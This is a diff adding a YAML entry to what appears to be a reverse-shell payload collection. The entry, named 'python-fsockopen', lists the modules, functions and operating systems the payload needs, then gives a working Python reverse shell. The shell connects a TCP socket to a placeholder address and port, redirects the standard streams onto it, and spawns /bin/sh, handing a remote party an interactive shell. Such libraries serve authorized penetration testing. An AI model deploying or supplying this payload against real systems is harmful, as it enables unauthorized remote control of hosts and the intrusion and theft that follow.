@@ -1,0 +1,40 @@
+---
+
+###
+### Meta definitions
+###
+specification:
+  payload: code
+  type: revshell
+  version: 0.0.1
+
+
+###
+### Code array
+###
+items:
+
+  - name: python-fsockopen
+    desc: description
+    info: []
+    rating: 1
+    code:
+      language: python
+      requires:
+        version: [2, 3]
+        commands: ["sh"]                      # Used shell commands
+        functions: ["socket", "connect", "dup2", "spawn", "fsockopen", "popen"]
+        modules: ["socket", "subprocess", "os", "pty"]
+        os: ["bsd", "linux", "mac"]           # Works on these operating systems
+    revshell:
+      proto: tcp
+      shell: sh
+      command: "/bin/sh"
+    payload: |
+      import socket,subprocess,os,pty;
+      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+      s.connect(("__ADDR__",__PORT__));
+      os.dup2(s.fileno(),0);
+      os.dup2(s.fileno(),1);
+      os.dup2(s.fileno(),2);
+      pty.spawn("/bin/sh");
